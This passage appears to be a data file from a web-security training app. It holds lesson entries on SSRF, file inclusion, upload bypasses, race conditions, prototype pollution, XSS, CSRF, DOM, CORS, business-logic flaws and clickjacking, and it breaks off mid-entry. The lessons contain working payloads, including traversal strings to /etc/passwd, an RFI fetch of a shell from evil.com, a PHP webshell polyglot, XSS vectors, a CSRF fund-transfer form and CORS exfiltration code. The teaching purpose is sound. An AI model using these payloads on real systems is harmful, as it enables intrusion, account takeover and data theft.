      "Protocol smuggling (file://, gopher://, dict://)",
      "Blind SSRF detection",
      "SSRF filter bypass techniques",
      "SSRF to RCE escalation",
    ],
    techniques: [
      "Target: http://127.0.0.1, http://localhost, http://[::1]",
      "Cloud: http://169.254.169.254/latest/meta-data/",
      "Bypass: decimal IP, IPv6, DNS rebinding",
      "Redirect-based SSRF bypass",
    ],
    cwe: ["CWE-918: Server-Side Request Forgery"],
  },
  {
    title: "File Inclusion and Path Traversal",
    icon: <FolderIcon />,
    color: "#f59e0b",
    description: "Local and Remote File Inclusion, directory traversal attacks.",
    detailedDescription: `File Inclusion and Path Traversal vulnerabilities allow attackers to read, and sometimes execute, files on the server. These are distinct but related vulnerabilities often found together.

**Path Traversal (Directory Traversal)**: The classic ../ attack. When an application uses user input to construct file paths: readFile("/var/www/files/" + filename), an attacker can supply ../../../etc/passwd to escape the intended directory and read arbitrary files. The number of ../ sequences needed depends on how deep the starting directory is.

**Local File Inclusion (LFI)**: Takes path traversal further in languages like PHP where include() or require() can execute code. If an application does: include($_GET['page'] . ".php"), an attacker can include any PHP file on the system. Combined with other techniques, LFI often leads to RCE.

**LFI to RCE Techniques**:
- **Log Poisoning**: Write malicious PHP to access log (via User-Agent header), then include the log file
- **PHP Wrappers**: php://filter/convert.base64-encode/resource=file to read PHP source, php://input to execute POST body as PHP
- **/proc/self/environ**: On Linux, may contain injectable environment variables
- **Session files**: Include PHP session files after polluting session data
- **Uploaded files**: If you can upload any file, include it - even if not in web directory

**Remote File Inclusion (RFI)**: When the application includes files from URLs: include($_GET['page']). Attacker can host malicious PHP and have the server fetch and execute it: ?page=http://evil.com/shell.php. RFI is rarer now as allow_url_include is disabled by default in PHP.

**Filter Bypass**: When basic traversal is blocked:
- URL encoding: %2e%2e%2f = ../, double encoding: %252e%252e%252f
- Null byte (older PHP): file.php%00 truncates the string
- Path normalization: ....// becomes ../ after removing ..
- Mixed slashes: ..\\..\\..\\windows\\win.ini on Windows`,
    realWorldExample: "A WordPress plugin vulnerability allowed LFI through the 'template' parameter. Attackers combined this with log poisoning: they sent requests with PHP code in the User-Agent header (which gets logged), then used LFI to include the access log. This executed their PHP code, giving them shell access to thousands of WordPress sites.",
    beginnerTips: [
      "Test with ../../../etc/passwd (Linux) or ..\\\\..\\\\..\\\\windows\\\\win.ini (Windows)",
      "If blocked, try URL encoding: %2e%2e%2f and double encoding: %252e%252e%252f",
      "Look for include() patterns in PHP: file=header&file=footer type parameters",
      "Try PHP wrappers: php://filter/convert.base64-encode/resource=index.php",
      "For RFI, test with your own URL: ?file=http://yourserver.com/test.txt"
    ],
    commonMistakes: [
      "Only testing ../ and not trying encoded variants",
      "Forgetting to test Windows paths on Windows servers (use backslash)",
      "Not attempting LFI-to-RCE escalation when LFI is confirmed"
    ],
    keyPoints: [
      "Local File Inclusion (LFI)",
      "Remote File Inclusion (RFI)",
      "Path traversal (../ sequences)",
      "Null byte injection (%00)",
      "Filter bypass techniques",
      "Log poisoning for LFI to RCE",
    ],
    techniques: [
      "Traversal: ../../../etc/passwd",
      "Encoding: ..%2f, ..%252f, ....//",
      "Wrappers: php://filter, php://input",
      "Windows: ..\\..\\..\\windows\\win.ini",
    ],
    cwe: ["CWE-22: Path Traversal", "CWE-98: Improper Control of Filename for Include"],
  },
  {
    title: "File Upload Vulnerabilities",
    icon: <UploadFileIcon />,
    color: "#10b981",
    description: "Bypassing upload restrictions to achieve code execution.",
    detailedDescription: `File upload vulnerabilities occur when applications allow users to upload files without proper validation, potentially leading to Remote Code Execution if malicious code is uploaded and executed by the server.

**The Attack Chain**: To achieve RCE via file upload, you need: (1) Upload a file containing code (e.g., PHP webshell), (2) Have it stored with an executable extension, (3) Know or guess where it's stored, (4) Access it via HTTP to trigger execution.

**Extension-Based Bypasses**: When .php is blocked:
- Alternative extensions: .php5, .php7, .phtml, .phar, .phps, .pHp (case variation)
- Double extensions: shell.php.jpg (some servers execute if PHP handler matches anywhere)
- Null byte: shell.php%00.jpg (older systems - truncates at null byte)
- .htaccess upload: Upload .htaccess with "AddType application/x-httpd-php .jpg" then upload shell.jpg

**Content-Type Bypasses**: Servers may check Content-Type header:
- Change Content-Type: application/x-php to image/jpeg while keeping PHP content
- The server checks the header but doesn't verify actual content

**Magic Byte Bypasses**: Some validators check file signatures (magic bytes):
- Add valid image header before PHP: GIF89a<?php system($_GET['cmd']); ?>
- Create polyglot files that are valid images AND contain executable code
- Use tools to create valid images with PHP in metadata/comments

**Where Files Are Stored**: Finding uploaded files:
- Check the response for the new file URL
- Common paths: /uploads/, /images/, /files/, /media/
- Check for directory listing to find upload folder
- Filename might be renamed - check for timestamps, hashes

**Beyond PHP**: Other dangerous file types:
- .aspx, .asp, .jsp - Server-side code for IIS/Java servers
- .svg - Can contain JavaScript (XSS) or XXE
- .html/.htm - XSS if served from same origin
- .config, .htaccess - Server configuration files
- Executables if server processes them (ImageMagick vulnerabilities)`,
    realWorldExample: "A pentester found a profile picture upload on a corporate app. The application blocked .php but accepted .phtml. They uploaded a simple webshell as profile.phtml, then accessed it at /uploads/profile.phtml?cmd=whoami - instant command execution. The company's 'image only' restriction only checked extensions, not content.",
    beginnerTips: [
      "Test alternative PHP extensions: .php5, .phtml, .phar, .phps",
      "Change Content-Type to image/jpeg while uploading PHP code",
      "Add GIF89a or PNG header bytes before your PHP code to bypass magic byte checks",
      "If you can upload .htaccess, add a rule to execute .jpg as PHP, then upload jpg shell",
      "Look in response headers and page source to find where uploaded files are stored"
    ],
    commonMistakes: [
      "Only trying .php extension and not testing alternatives",
      "Not checking if the file was actually stored with original name",
      "Forgetting to test file upload for path traversal in filename (../../../shell.php)"
    ],
    keyPoints: [
      "Extension bypass (.php5, .phtml, .phar)",
      "Content-Type manipulation",
      "Magic byte injection",
      "Double extension attacks",
      "Null byte in filename",
      "SVG/XML upload for XSS/XXE",
      "Polyglot files (valid image + code)",
    ],
    techniques: [
      "Test: shell.php.jpg, shell.php%00.jpg",
      "Bypass: change Content-Type to image/jpeg",
      "Add valid image header before PHP code",
      "Case variation: .PhP, .PHP5",
      "Check for path traversal in filename",
    ],
    cwe: ["CWE-434: Unrestricted Upload of File with Dangerous Type"],
  },
  {
    title: "Race Conditions",
    icon: <SpeedIcon />,
    color: "#06b6d4",
    description: "Time-of-check to time-of-use (TOCTOU) and other race condition attacks.",
    detailedDescription: `Race conditions occur when application behavior depends on timing, and attackers can manipulate that timing to achieve unintended results. The most common pattern is TOCTOU: the server checks something, then uses it - but between check and use, the attacker changes the state.

**Classic Example - Coupon/Discount Abuse**: An e-commerce site lets users apply a $50 coupon once. The vulnerable flow:
1. Check: Is coupon already used? No
2. Apply $50 discount
3. Mark coupon as used
If you send two identical requests simultaneously, both might pass the check (before either marks it used), and you get $100 off.

**Where to Find Race Conditions**:
- **Financial transactions**: Transfer money, apply discounts, redeem gift cards
- **Limit enforcement**: Vote limits, invitation limits, download limits
- **Status changes**: Follow/unfollow, like/unlike, claim rewards
- **File operations**: Upload a file, access before virus scan completes
- **Session handling**: Login while changing password, parallel session creation

**How to Test**: You need simultaneous requests - network latency makes this hard:
- **Turbo Intruder**: Burp extension with Python scripting for fast parallel requests
- **HTTP/2 single-packet attack**: Bundle many requests in one TCP packet (new technique)
- **Burp Repeater groups**: Send multiple requests in parallel
- **Race The Web**: Specialized tool for race condition testing

**Indicators of Vulnerability**:
- Any operation with check-then-act pattern
- Limits that can be profitable to bypass
- Multiple-step operations (check balance -> make transfer -> update balance)
- Using database transactions without proper locking

**HTTP/2 Single-Packet Attack**: HTTP/2 allows multiplexing - multiple requests in one connection. By buffering requests and sending them in a single TCP packet, they arrive at the server virtually simultaneously, reducing timing inconsistency. This technique dramatically improves race condition exploitation.`,
    realWorldExample: "Bug bounty hunter found a race condition in a fintech app's bonus system. New users got $10 bonus on first deposit. By sending 50 simultaneous deposit requests right after signup, 47 of them received the bonus before the flag was set - turning $100 deposit into $570 in bonuses. The fix required database-level locking.",
    beginnerTips: [
      "Any operation with limits (once per user, max 3, etc.) is worth testing for race conditions",
      "Use Burp's 'Send group in parallel' feature to send identical requests simultaneously",
      "Install Turbo Intruder extension for more powerful race condition testing",
      "HTTP/2 sites are easier to exploit - requests arrive closer together",
      "Test financial features first - they often have race conditions with real impact"
    ],
    commonMistakes: [
      "Sending requests one at a time instead of truly simultaneously",
      "Not using specialized tools - regular sequential requests rarely trigger race conditions",
      "Missing race conditions in non-obvious places like session handling"
    ],
    keyPoints: [
      "TOCTOU vulnerabilities",
      "Limit overrun (coupon reuse, balance manipulation)",
      "File operation races",
      "Session race conditions",
      "Database race conditions",
    ],
    tools: ["Turbo Intruder", "Race The Web", "Burp Repeater (parallel)"],
    techniques: [
      "Send many parallel requests simultaneously",
      "Target: coupon redemption, account balance, voting",
      "Use HTTP/2 single-packet attack",
      "Test file upload + access race",
    ],
    cwe: ["CWE-362: Race Condition"],
  },
  {
    title: "Server-Side Prototype Pollution",
    icon: <DataObjectIcon />,
    color: "#ec4899",
    description: "Polluting JavaScript object prototypes on the server for various attacks.",
    detailedDescription: `Prototype Pollution is a JavaScript-specific vulnerability where an attacker can modify the prototype of base objects (like Object.prototype), affecting all objects in the application. On the server-side (Node.js), this can lead to authentication bypass, denial of service, or even Remote Code Execution.

**How JavaScript Prototypes Work**: In JavaScript, objects inherit properties from their prototype. Object.prototype is the root prototype for most objects. If you add a property to Object.prototype, ALL objects will have that property:
Object.prototype.isAdmin = true;
let user = {};
console.log(user.isAdmin); // true!

**The Attack Vector**: The vulnerability occurs when applications unsafely merge or clone user input into objects:
// Vulnerable merge function
function merge(target, source) {
  for (let key in source) {
    target[key] = source[key];
  }
}
// Attacker sends: {"__proto__": {"isAdmin": true}}
merge(userObj, attackerInput);  // Pollutes Object.prototype!

**Pollution Paths**:
- __proto__: Direct access to prototype (the most common)
- constructor.prototype: Alternative path to the same prototype
- Object.setPrototypeOf: Function call to modify prototype

**Impact Severity**:
- **Authentication Bypass**: If app checks if(user.isAdmin), pollute isAdmin=true
- **DoS**: Override toString or other critical methods to crash the app
- **RCE via Gadgets**: Some Node.js libraries have code paths (gadgets) that execute if certain properties exist. Pollute those properties to trigger code execution.

**Detection Methods**:
- Send JSON with __proto__: {"__proto__": {"test": "polluted"}}
- Check if the pollution persists: create new object, check if it has 'test' property
- Tools: ppfuzz, ppmap for automated detection

**Common Vulnerable Patterns**: Recursive merge functions, deep clone utilities, flat-to-nested object converters, libraries like lodash.merge (older versions), express body-parser with certain configurations.`,
    realWorldExample: "A critical prototype pollution vulnerability was found in Lodash (CVE-2019-10744), a library used by millions of JavaScript projects. Attackers could pollute Object.prototype through the merge() function. Combined with template engine gadgets, this could achieve RCE on Node.js servers. Any application using the vulnerable lodash.merge with user input was exploitable.",
    beginnerTips: [
      "Send {\"__proto__\": {\"test\": 123}} in JSON POST requests and check if new objects have 'test' property",
      "Also try constructor.prototype path: {\"constructor\": {\"prototype\": {\"test\": 123}}}",
      "Look for merge, clone, or extend functions that process user input",
      "In Node.js apps using EJS/Pug/Handlebars, prototype pollution + template gadgets can = RCE"
    ],
    commonMistakes: [
      "Only testing __proto__ and not constructor.prototype",
      "Not verifying if pollution actually persists beyond the initial object",
      "Missing prototype pollution in non-JSON inputs (query strings can be parsed as nested objects)"
    ],
    keyPoints: [
      "Polluting Object.prototype via __proto__",
      "Constructor prototype pollution",
      "Gadget chains for RCE",
      "DoS via prototype pollution",
      "Bypassing security checks",
    ],
    techniques: [
      "Payload: {\"__proto__\": {\"admin\": true}}",
      "Target: JSON merge operations, lodash.merge",
      "Look for RCE gadgets (child_process spawn options)",
      "Test: {\"constructor\": {\"prototype\": {\"polluted\": true}}}",
    ],
    cwe: ["CWE-1321: Improperly Controlled Modification of Object Prototype Attributes"],
  },
  {
    title: "Misconfiguration and Debug Endpoints",
    icon: <SettingsIcon />,
    color: "#6366f1",
    description: "Exploiting exposed debug features, default configs, and sensitive endpoints.",
    keyPoints: [
      "Debug mode enabled in production",
      "Stack traces and verbose errors",
      "Default credentials",
      "Exposed admin panels",
      "Actuator/health endpoints (Spring Boot)",
      "GraphQL introspection enabled",
      "Exposed .git, .env, backup files",
    ],
    techniques: [
      "Check: /debug, /console, /actuator, /graphql",
      "Test for Spring Boot Actuator endpoints",
      "Look for phpinfo(), Django debug mode",
      "Enumerate /.git/config, /.env, /backup.sql",
    ],
  },
];

// Section 5: Client-Side Attacks
const clientSideTopics: TopicSection[] = [
  {
    title: "Cross-Site Scripting (XSS)",
    icon: <JavascriptIcon />,
    color: "#ef4444",
    description: "Reflected, Stored, and DOM-based XSS attacks and filter bypasses.",
    detailedDescription: `Cross-Site Scripting (XSS) allows attackers to inject malicious JavaScript into web pages viewed by other users. It's been in the OWASP Top 10 for over two decades because it's so common and impactful.

**Three Types of XSS**:
- **Reflected XSS**: Payload comes from the current HTTP request (URL parameter, form input). Requires victim to click a malicious link. Example: https://site.com/search?q=<script>alert(1)</script>
- **Stored XSS**: Payload is permanently stored on the server (database, comments, profiles). Every user who views the content gets attacked. Much more dangerous - no special link needed.
- **DOM-based XSS**: Payload never goes to server. JavaScript takes attacker-controlled input (location.hash, postMessage) and unsafely writes it to DOM (innerHTML, eval).

**What Attackers Can Do With XSS**:
- Steal session cookies (unless HttpOnly flag is set)
- Capture keystrokes and form data (credentials)
- Take actions as the victim (change email, password, make purchases)
- Redirect users to phishing pages
- Spread like a worm (stored XSS that posts itself to other users)

**Finding XSS**:
1. Identify where user input is reflected in the page
2. Determine the context: inside HTML, inside a tag attribute, inside JavaScript code, inside CSS
3. Craft payload appropriate for that context
4. Bypass any filters/encoding

**Context-Specific Payloads**:
- HTML context: <script>alert(1)</script> or <img onerror=alert(1) src=x>
- Attribute context: " onclick=alert(1) x="  (close the attribute, add event)
- JavaScript context: '; alert(1); // (close string, execute, comment rest)
- URL context: javascript:alert(1)

**Filter Bypass Techniques**:
- Case variation: <ScRiPt>alert(1)</sCrIpT>
- HTML encoding: &#x3c;script&#x3e; or &#60;script&#62;
- Without parentheses: <img onerror=alert\`1\` src=x>
- Without spaces: <svg/onload=alert(1)>
- Event handlers: onmouseover, onfocus, onerror are rarely filtered
- Mutation XSS: Let the browser's HTML parser "fix" your malformed HTML into valid XSS`,
    realWorldExample: "The 2005 Samy worm exploited stored XSS on MySpace. Samy Kamkar crafted JavaScript that bypassed filters and added itself to viewers' profiles while making them follow Samy. Within 20 hours, over 1 million users were infected, crashing MySpace. This demonstrated how stored XSS can spread virally.",
    beginnerTips: [
      "Start with <script>alert(1)</script>, then try <img onerror=alert(1) src=x> if script tags are blocked",
      "Always check in which context your input appears (HTML, attribute, JavaScript, URL)",
      "Use browser DevTools to see if your input is being HTML-encoded or filtered",
      "XSS Hunter (xss.ht) gives you a payload that calls home when triggered - great for blind XSS",
      "Check for XSS in unexpected places: filename displays, error messages, JSON APIs rendered as HTML"
    ],
    commonMistakes: [
      "Only testing basic <script> tags without trying event handlers like onerror, onload, onclick",
      "Not considering the context - what works in HTML won't work inside JavaScript strings",
      "Forgetting to test stored XSS in all places input is displayed (profile, comments, logs)"
    ],
    keyPoints: [
      "Reflected XSS in URL parameters",
      "Stored XSS in user content",
      "DOM-based XSS via client-side code",
      "Mutation XSS (mXSS)",
      "Context-aware payload crafting",
      "CSP bypass techniques",
      "XSS filter evasion",
    ],
    tools: ["XSS Hunter", "Burp Suite", "DOMPurify (for testing)", "BeEF"],
    techniques: [
      "Basic: <script>alert(1)</script>",
      "Event handlers: <img onerror=alert(1) src=x>",
      "SVG: <svg onload=alert(1)>",
      "Template literals: ${alert(1)}",
      "Encoding bypass: &#x3c;script&#x3e;",
    ],
    cwe: ["CWE-79: Cross-site Scripting"],
  },
  {
    title: "Cross-Site Request Forgery (CSRF)",
    icon: <SyncAltIcon />,
    color: "#f59e0b",
    description: "Forcing authenticated users to perform unintended actions.",
    detailedDescription: `Cross-Site Request Forgery (CSRF) forces authenticated users to perform actions they didn't intend to. The attack exploits the fact that browsers automatically include cookies with requests, so if you're logged into bank.com, any request to bank.com from anywhere includes your session cookie.

**How CSRF Works**:
1. Victim is logged into target.com (has session cookie)
2. Victim visits attacker's page (evil.com)
3. Attacker's page makes a request to target.com (via form, image, AJAX)
4. Browser includes victim's cookies automatically
5. Target.com sees valid session cookie, performs action as victim

**Classic CSRF Example**:
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('f').submit();</script>

When victim loads this page, their browser submits the form to bank.com with their session cookie.

**CSRF Token Protection**: Most apps defend by including a random token in forms that attackers can't know. Always check if:
- Token is actually validated (try removing it)
- Token is tied to session (try using another user's token)
- Token is properly random (predictable tokens are useless)
- Token is validated for all methods (might only check POST, not PUT/DELETE)

**SameSite Cookie Attribute**:
Modern defense - cookies with SameSite=Strict aren't sent on cross-origin requests.
- SameSite=Strict: Never sent cross-origin
- SameSite=Lax: Sent only on top-level navigations (GET), not embedded requests
- SameSite=None: Always sent (must have Secure flag)

**Bypassing Protections**:
- Check if token is validated (remove it, change it)
- Try GET method if POST uses tokens (many apps forget GET)
- Check API endpoints (may lack CSRF protection on JSON endpoints)
- Exploit XSS to steal CSRF token
- Check for token prediction or leakage in URL/Referer`,
    realWorldExample: "A pentester found CSRF in a password change function. The form had a CSRF token, but testing revealed the server only checked if the token parameter existed, not its value. They submitted token=anything and it worked. This allowed changing any user's password by sending them a malicious link.",
    beginnerTips: [
      "Check for missing CSRF tokens on state-changing requests (POST, PUT, DELETE)",
      "If token exists, test: remove it, use empty value, use another user's token",
      "Even with tokens, test if the action works via GET method (often unprotected)",
      "Look at SameSite attribute on session cookies in DevTools  Application  Cookies",
      "Use Burp's CSRF PoC generator (right-click request  Generate CSRF PoC)"
    ],
    commonMistakes: [
      "Assuming CSRF tokens are validated without actually testing them",
      "Not testing GET method for endpoints that should require POST",
      "Forgetting to test API endpoints which often lack CSRF protection"
    ],
    keyPoints: [
      "Classic CSRF with form submission",
      "CSRF token bypass techniques",
      "JSON-based CSRF attacks",
      "Login CSRF for session fixation",
      "Logout CSRF for denial of service",
      "SameSite cookie bypass",
    ],
    techniques: [
      "Check for missing CSRF tokens",
      "Test token validation (remove, reuse, predictable)",
      "Try changing Content-Type for JSON endpoints",
      "Test GET-based state-changing operations",
      "Check SameSite cookie attribute",
    ],
    cwe: ["CWE-352: Cross-Site Request Forgery"],
  },
  {
    title: "DOM-Based Attacks",
    icon: <WebIcon />,
    color: "#8b5cf6",
    description: "Client-side vulnerabilities exploiting DOM manipulation.",
    detailedDescription: `DOM-based vulnerabilities occur entirely in the browser when JavaScript takes attacker-controlled data and processes it unsafely. Unlike reflected/stored XSS, the malicious payload typically never reaches the server.

**Source  Sink Model**: 
- **Sources**: Where attacker-controlled data enters JavaScript
  - location.hash, location.search, location.href
  - document.referrer
  - document.cookie
  - window.name
  - postMessage data
  - localStorage/sessionStorage
- **Sinks**: Dangerous functions that execute/write attacker data
  - innerHTML, outerHTML
  - document.write, document.writeln
  - eval(), setTimeout/setInterval with strings
  - .href, .src assignments
  - jQuery's $() with HTML strings

**DOM XSS Example**:
// Vulnerable code:
let query = location.hash.substring(1);
document.getElementById('results').innerHTML = query;
// URL: https://site.com/#<img onerror=alert(1) src=x>

**DOM Clobbering**: Manipulate the DOM to make JavaScript reference attacker-controlled elements:
<form id="config"><input name="id" value="malicious"></form>
Now document.getElementById('config').id returns the form, not expected element.

**PostMessage Vulnerabilities**: When sites communicate via postMessage without proper origin validation:
// Vulnerable receiver:
window.addEventListener('message', function(e) {
  eval(e.data);  // No origin check - any site can send messages!
});

**Open Redirect via DOM**: JavaScript that redirects based on URL parameters:
window.location = params.get('url');  // Attacker: ?url=https://evil.com

**Testing Approach**:
1. Search JavaScript for dangerous sinks (grep for innerHTML, eval, etc.)
2. Trace backwards - can attacker control data reaching those sinks?
3. Use browser DevTools to set breakpoints on sinks
4. Try DOM Invader (Burp Suite extension) for automated detection`,
    realWorldExample: "Google's OAuth had a DOM XSS via the postMessage API. A researcher found that Google's sign-in widget accepted messages from any origin without validation. An attacker's page could send a crafted message that got injected into the DOM, allowing JavaScript execution in Google's context and stealing OAuth tokens.",
    beginnerTips: [
      "Use browser DevTools 'Search Across All Files' (Ctrl+Shift+F) to find innerHTML, eval, document.write",
      "Put .innerHTML in console and check what happens: document.body.innerHTML = '<img onerror=alert(1) src=x>'",
      "Test postMessage by opening console on site and running: window.postMessage('test', '*')",
      "Check URL hash handling: try adding #<script>alert(1)</script> to URLs",
      "Install DOM Invader (Burp) for automated sink detection"
    ],
    commonMistakes: [
      "Only testing server-side XSS without examining JavaScript code for DOM sinks",
      "Not checking postMessage handlers - these are commonly vulnerable",
      "Missing DOM XSS because it doesn't show up in server logs or Burp history"
    ],
    keyPoints: [
      "DOM XSS via innerHTML, document.write",
      "DOM-based open redirect",
      "DOM clobbering",
      "Client-side template injection",
      "Prototype pollution in browser",
      "PostMessage vulnerabilities",
    ],
    techniques: [
      "Trace data flow from sources to sinks",
      "Sources: location.hash, location.search, document.referrer",
      "Sinks: innerHTML, eval, setTimeout, location",
      "Test postMessage origin validation",
    ],
    cwe: ["CWE-79: Cross-site Scripting"],
  },
  {
    title: "CORS and Same-Origin Policy",
    icon: <PolicyIcon />,
    color: "#10b981",
    description: "Misconfigured Cross-Origin Resource Sharing and SOP bypass.",
    detailedDescription: `The Same-Origin Policy (SOP) is a fundamental browser security mechanism that prevents websites from reading data from other origins. CORS (Cross-Origin Resource Sharing) is a controlled way to relax this restriction. Misconfigurations in CORS can allow attackers to steal sensitive data.

**Same-Origin Policy Basics**: An origin is defined by scheme (http/https), host (domain), and port. Scripts from one origin can make requests to another origin, but cannot READ the response unless explicitly allowed via CORS.

**How CORS Works**:
1. Browser makes cross-origin request
2. Server responds with Access-Control-Allow-Origin header
3. If the header matches the requesting origin, browser allows JavaScript to read the response
4. For requests with credentials, Access-Control-Allow-Credentials: true must be set

**Dangerous Misconfigurations**:
- **Wildcard with credentials**: Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true (actually blocked by browsers)
- **Reflecting Origin**: Server sets ACAO to whatever Origin header is sent - allows any site to read responses
- **Null origin allowed**: Access-Control-Allow-Origin: null - exploitable from sandboxed iframes
- **Subdomain trust**: Trusting any *.company.com when some subdomains may be compromised
- **Prefix matching**: Trusting 'company.com' but accepting 'company.com.evil.com'

**Exploitation**:
If CORS is misconfigured, an attacker's website can read API responses:
// Attacker's page:
fetch('https://api.target.com/user/data', {credentials: 'include'})
  .then(r => r.json())
  .then(data => send_to_attacker(data));

**Testing CORS**:
1. Send request with Origin: https://evil.com
2. Check if Access-Control-Allow-Origin reflects 'evil.com'
3. Check if Access-Control-Allow-Credentials is true (for cookie-based auth)
4. Test null origin from sandboxed iframe
5. Test subdomain variations if some subdomains are allowed`,
    realWorldExample: "A financial services API reflected any Origin header in its CORS response and allowed credentials. An attacker created a malicious page that, when visited by logged-in users, made API requests to fetch account balances and transaction history. The data was exfiltrated to the attacker's server, compromising thousands of accounts.",
    beginnerTips: [
      "Always test with Origin: https://evil.com header and check if it's reflected in ACAO",
      "Check if Access-Control-Allow-Credentials: true is set (needed for cookie-based exploitation)",
      "Test null origin by opening an iframe with sandbox attribute: <iframe sandbox='allow-scripts'>",
      "Look for CORS on API endpoints that return sensitive data (/api/user, /api/account)",
      "Even without credentials, CORS misconfig can leak non-authenticated API data"
    ],
    commonMistakes: [
      "Thinking wildcard (*) allows credential-based attacks (browsers block this combination)",
      "Only testing with your own domain instead of evil.com as Origin",
      "Missing CORS issues on internal/admin APIs that trust external origins"
    ],
    keyPoints: [
      "Overly permissive Access-Control-Allow-Origin",
      "Null origin exploitation",
      "Credential leakage via CORS",
      "Pre-flight request bypass",
      "CORS header injection",
    ],
    techniques: [
      "Test: Origin: https://evil.com",
      "Check for wildcard (*) with credentials",
      "Test null origin from sandboxed iframes",
      "Check for origin reflection without validation",
      "Verify Access-Control-Allow-Credentials",
    ],
    cwe: ["CWE-942: Permissive CORS Policy"],
  },
  {
    title: "Client-Side Validation and Business Logic",
    icon: <FactCheckIcon />,
    color: "#06b6d4",
    description: "Bypassing client-side controls and exploiting business logic flaws.",
    detailedDescription: `Client-side validation and business logic testing is about finding places where the application trusts data it shouldn't trust. Any validation done only in JavaScript can be bypassed - attackers can modify requests after they leave the browser.

**The Golden Rule**: Never trust client-side validation. Every check done in JavaScript MUST also be done on the server. If it isn't, there's a vulnerability.

**Common Client-Side Controls**:
- Form validation (length, format, required fields)
- Disabled form fields (can still be modified in requests)
- Hidden form fields (prices, user IDs, roles)
- JavaScript that prevents certain actions
- Dropdown/select limiting choices
- File type restrictions

**Bypassing Methods**:
1. **Intercept with Burp**: Modify the request after it leaves the browser
2. **Browser DevTools**: Edit hidden fields, enable disabled inputs, modify JavaScript
3. **Replay modified requests**: Capture legitimate request, modify values, resend

**Business Logic Flaws**: These occur when application workflow can be abused:
- **Price manipulation**: Change price=100 to price=1 in hidden field
- **Quantity abuse**: Order quantity=-1 for negative charges (refund)
- **Step skipping**: Go directly to step 3 without completing steps 1-2
- **Parameter tampering**: Change user_id to access others' data
- **Function abuse**: Use admin-only features by guessing endpoints

**Example Scenarios**:
- E-commerce: Add item to cart, intercept checkout request, change totalPrice
- Registration: Change user role from 'user' to 'admin' in hidden field
- Multi-step process: Skip payment step by directly accessing 'order-complete' endpoint
- Discount codes: Apply discount multiple times, or to ineligible items

**Testing Methodology**:
1. Map all client-side controls (disabled fields, dropdowns, validation)
2. Try to bypass each one via proxy interception
3. Test with unexpected values (negative numbers, zero, huge numbers)
4. Skip steps in multi-step processes
5. Manipulate anything that looks like it determines price, role, or permissions`,
    realWorldExample: "An online store calculated the total price in JavaScript and sent it to the server for processing. By intercepting the checkout request and changing the total from $500 to $1, orders completed successfully at the modified price. The server trusted the client-calculated total instead of recalculating from item prices.",
    beginnerTips: [
      "Always check hidden form fields - they often contain prices, IDs, or roles that can be modified",
      "Try negative numbers in quantity fields - sometimes you get a refund instead of charge",
      "Disabled form fields can be enabled via DevTools (right-click  Edit as HTML  remove 'disabled')",
      "Change user_id, account_id parameters to access other users' resources",
      "In multi-step processes, try accessing later steps directly by URL or skipping requests"
    ],
    commonMistakes: [
      "Assuming disabled form fields can't be submitted (they can via Burp)",
      "Not testing with extreme values (zero, negative, very large numbers)",
      "Trusting dropdown/select values - the actual request can contain anything"
    ],
    keyPoints: [
      "Hidden form field manipulation",
      "Client-side price/quantity modification",
      "Step skipping in multi-step processes",
      "Parameter tampering",
      "Business logic race conditions",
      "Negative quantity/price attacks",
    ],
    techniques: [
      "Intercept and modify all client-side validated data",
      "Test purchase flows with negative values",
      "Skip steps by directly accessing URLs",
      "Modify hidden fields (user ID, prices, roles)",
      "Test limits and boundaries",
    ],
  },
  {
    title: "Clickjacking and UI Redressing",
    icon: <MouseIcon />,
    color: "#ec4899",
    description: "Tricking users into clicking hidden elements via iframe overlay.",
    detailedDescription: `Clickjacking tricks users into clicking on something different from what they perceive. The classic attack overlays a transparent page (in an iframe) over an attacker-controlled page, so when users click what looks like an innocent button, they're actually clicking on the hidden page.

**How Clickjacking Works**:
1. Attacker creates a page with an invisible iframe loading target site
2. Attacker positions the iframe so a sensitive button (delete, purchase, follow) aligns with a visible decoy button
3. Victim thinks they're clicking "Play Video" but actually click "Delete Account"

**Basic Clickjacking PoC**:
<style>
  iframe { opacity: 0; position: absolute; top: 0; left: 0; }
  button { position: absolute; top: 50px; left: 100px; }
</style>
<iframe src="https://target.com/delete-account"></iframe>
<button>Click to WIN!</button>

**Variations**:
- **Likejacking**: Trick users into liking/following on social media
- **Cursorjacking**: Move cursor position so clicks land elsewhere
- **Double-clickjacking**: First click enables iframe, second click performs action
- **Drag-and-drop**: Manipulate users into dragging content into hidden areas

**Defenses to Test**:
- **X-Frame-Options**: DENY (never framable), SAMEORIGIN (only same-origin can frame)
- **CSP frame-ancestors**: More flexible than X-Frame-Options
  - frame-ancestors 'none' = DENY
  - frame-ancestors 'self' = SAMEORIGIN
  - frame-ancestors https://trusted.com = specific origin
- **Frame-busting JavaScript**: document.top != document.self (easily bypassed)

**Testing for Clickjacking**:
1. Check response headers for X-Frame-Options and CSP frame-ancestors
2. Try embedding the target page in an iframe on your server
3. If no protection, create PoC demonstrating the attack
4. Focus on pages with sensitive one-click actions (delete, purchase, settings changes)

**When Clickjacking Matters**: It requires user interaction, so it's most impactful when:
- One-click sensitive actions exist (no confirmation)
- Target is logged in (session cookie makes action authenticated)
- Action has significant impact (delete, purchase, settings change)`,
    realWorldExample: "Facebook had a clickjacking vulnerability where attackers could make users unknowingly 'Like' any page. Malicious sites displayed 'Watch Video' buttons positioned over invisible Facebook Like buttons. Millions of fraudulent likes were generated before frame-busting defenses were implemented, pioneering the term 'likejacking'.",
    beginnerTips: [
      "Check X-Frame-Options and CSP frame-ancestors headers first - if present and correct, likely not vulnerable",
      "Create a simple HTML file with <iframe src='https://target.com/sensitive-page'> to test framing",
      "Focus on pages with one-click actions: delete buttons, toggles, purchase confirmations",
      "Use opacity: 0.5 instead of 0 while testing so you can see the iframe alignment",
      "Even with frame-busting JS, try sandbox='allow-forms' on iframe to disable JS"
    ],
    commonMistakes: [
      "Thinking JavaScript frame-busting is sufficient (can be bypassed with sandbox attribute)",
      "Only testing the homepage instead of pages with sensitive actions",
      "Forgetting that clickjacking requires the user to be logged in to be impactful"
    ],
    keyPoints: [
      "Classic clickjacking with transparent iframe",
      "Likejacking on social platforms",
      "Cursorjacking attacks",
      "Drag-and-drop data theft",
      "X-Frame-Options bypass",
      "CSP frame-ancestors bypass",
    ],
    techniques: [
      "Check for X-Frame-Options header",
      "Check CSP frame-ancestors directive",
      "Test iframe embedding from different origins",
